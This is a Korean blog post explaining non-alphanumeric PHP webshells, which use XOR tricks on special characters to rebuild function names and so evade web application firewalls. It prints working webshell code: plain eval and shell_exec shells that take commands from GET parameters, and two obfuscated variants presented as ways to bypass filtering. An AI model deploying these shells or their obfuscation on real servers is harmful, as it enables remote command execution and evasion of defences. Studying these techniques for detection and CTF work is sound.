---

layout: post
title: "non-alphanumeric webshell"
excerpt: "Try to know non-alphanumeric webshell & use it ~_~"
date: 2019-03-11
categories: [Web]
comments: true 

---

## non-alphanumeric webshell

이번에는 non-alphanumeric webshell에 관하여 알아보자.  이름에서 알 수 있듯이 오직 특수문자로만 구성된 웹쉘 페이로드를 말한다. 이는 일반적으로 정규표현식등을 이용하며 숫자와 일반 알파벳 문자열을 포함하는 웹쉘 페이로드와는 다르게 WAF를 우회하기 위하여 만들어졌다. WAF는 Web Application Firewall로 웹 방화벽을 뜻한다. 

WAF는 보통 파일의 확장자를 탐지하여 보안하는 방법, 업로드된 파일을 이용하여 파라미터로 전송되는 OS명령어를 탐지하여 보안하는 방법, 업로드 되는 파일의 내부에 실행함수를 탐지하는 방법으로 웹쉘을 탐지한다.

보통 처음 방법인 파일 확장자를 이용하여 탐지하는 방법은 해커가 웹쉘파일을 업로드할 때  정상적인 파일에 웹쉘을 삽입하여 업로드하는 것 등을 막아준다. 이런 경우는 snort등의 탐지도구를 이용하여 보안이 가능하다. 

다음으론 OS명령어를 탐지하는 방법과 파일 내부의 실행함수를 이용하여 탐지하는 방법인데, 바로 이 방법에서 non-alphanumeric webshell이 효과를 보인다. 보통 WAF가 탐지하는 명령어들은 php의 경우 exec()함수, popen()함수, system()함수, shell_exec()함수이고 이외에 jsp같은 경우 Runtime.getRuntime().exec()함수인데, non-alphanumeric webshell은 이러한 함수들을 사용할 필요가 없으니 간단하게 WAF를 우회할 수 있게된다. 

물론 이외에도 웹쉘에서 자주 사용되는 함수는 eval , passthru , require , fwrite 등 다양하다. 

<hr>

보통의 웹쉘의 예제를 확인해보자.

```php
<?php
if(!preg_match('/[a-z0-9]/is',$_GET['shell'])) {
  eval($_GET['shell']);
}?>

<?php
echo shell_exec($_GET['cmd']);
?>
```

보통은 이런식의 형태를 띈다.  하지만 이런 경우는 보편적으로 필터링이 되어있거나 WAF로 인하여 보안이 된다.

그래서 우리는 시큐어코딩 뿐만 아니라 WAF등의 솔루션도 우회하기 위하여 no letter, no number의 non-alphanumeric을 이용한다.  아래의 예시들을 확인해보자. 

```php
<?
$_="{"; #XOR char
$_=($_^"<").($_^">;").($_^"/"); #XOR = GET
?>
<?=${'_'.$_}["_"](${'_'.$_}["__"]);?> # Exec :)
```

```php
<?php

$_[]=@!+_; $__=@${_}>>$_;$_[]=$__;$_[]=@_;@$_[((++$__)+($__++ ))].=$_;
$_[]=++$__; $_[]=$_[--$__][$__>>$__];$_[$__].=(($__+$__)+ $_[$__-$__]).($__+$__+$__)+$_[$__-$__];
$_[$__+$__] =($_[$__][$__>>$__]).($_[$__][$__]^$_[$__][($__<<$__)-$__] );
$_[$__+$__] .=($_[$__][($__<<$__)-($__/$__)])^($_[$__][$__] );
$_[$__+$__] .=($_[$__][$__+$__])^$_[$__][($__<<$__)-$__ ];
$_=$ 
$_[$__+ $__] ;$_[@-_]($_[@!+_] );
 
?> 
```

대표적인 예로는 위에 코드등이 있으며, 이를 이용한 다양한 문제들이 존재한다. 가장 대표적인 코드는 xor연산을 이용하여 원하는 문자열을 만들어주는 방식이다. 

아니면 .dynstr을 이용하여 포너블에서 문제를 해결하는 것 처럼  php에 내장되어 있는 함수의 네이밍을 이용하여 원하는 문자열을 제작하는 방법도 있다. A를 얻기 위하여 array[]를 사용한다던가 하는 방법이 그 예이다. 

